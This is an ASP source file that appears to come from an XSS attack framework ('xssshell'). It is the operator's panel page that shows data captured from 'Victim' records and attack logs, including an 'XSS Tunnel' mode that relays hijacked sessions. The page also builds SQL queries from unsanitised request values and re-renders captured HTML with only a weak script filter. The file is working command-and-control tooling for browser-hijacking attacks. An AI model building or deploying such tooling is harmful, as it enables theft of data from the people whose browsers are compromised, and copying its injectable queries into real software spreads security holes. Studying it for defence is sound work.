<%
'// SHOW DATA
' Show detailed data from records be carefull about backfire XSS attacks!

'//HISTORY
'09/08/2006
'	- Started
'01.04.2007
'	- Log Check replaced with AttackID instead of ID


'//TODO
' - Safe HTML method (you can manually implement this page to a subpage for a more secure HTML viewing expreience)
' - Remove previously injected payload  (if any)

%>
<!--#include file="db.asp" -->

<%
	protected()

	Dim mode
	mode = fm_Qnstr("m")

	Select Case mode
		Case 1
			ShowData
				
		Case 2 'XSS Tunnel
			ShowHTML 2

		Case Else
			ShowHTML 1
	
	End Select


	Sub ShowData()
		Dim RsData
		getRs RsData, "SELECT Data FROM Victim WHERE ID = " & fm_Qnstr("i")

		Response.Write "<blockquote>" & fm_Encode(RsData("Data")) & "</blockquote>"

		fmKill RsData


	End Sub


	Sub ShowHTML(mode)

		Dim RsData
		getRs RsData, "SELECT ID, Data, Type, [Time] FROM Log  WHERE AttackID = '" & fm_Qnstr("i") & "'"
		
		If RsData.EOF And RsData.BOF Then
			Response.Write "NO_RECORD"
			Exit Sub
		End If


		Select Case mode
			Case 1 'Old School
				Response.Write	"Time : " & RsData("Time") & "<hr>"

				Dim Data2Write
				Data2Write = RsData("Data")
				
				%>
				
					<script>
						window.onload=function(){				
							var newdoc = filter(unescape("<%=Data2Write%>"));				

							document.open();
							document.write(newdoc);
							document.close();
						}

						
						/*
								 You should;
									- implement your own filter here if it's not style otherwise xssshell will call itelf recursively
								 You can;
									- Build a filter for against backfire (XSS attacks from so called victim - don't forget this page and your patterns will be visible to everyone.)
									- or strip all HTML etc...

						*/

						function filter(html){
							return html.replace(/<SCRIPT\b[^>]*>(.*?)<\/SCRIPT>/i, "");
						}
					</script>
		
		<%

		Case 2 'XSS Tunnel
			
			If IsNull(RsData("Data"))  Then
				Response.Write "NO_RECORD"
				Exit Sub
			End If 

			Dim data 
			data  = RsData("Data")
'			data  = Replace(data, "xssshell.asp","none.htm")

			Response.Write fm_Encode(data)

		End Select


		fmKill RsData
	End Sub
%>

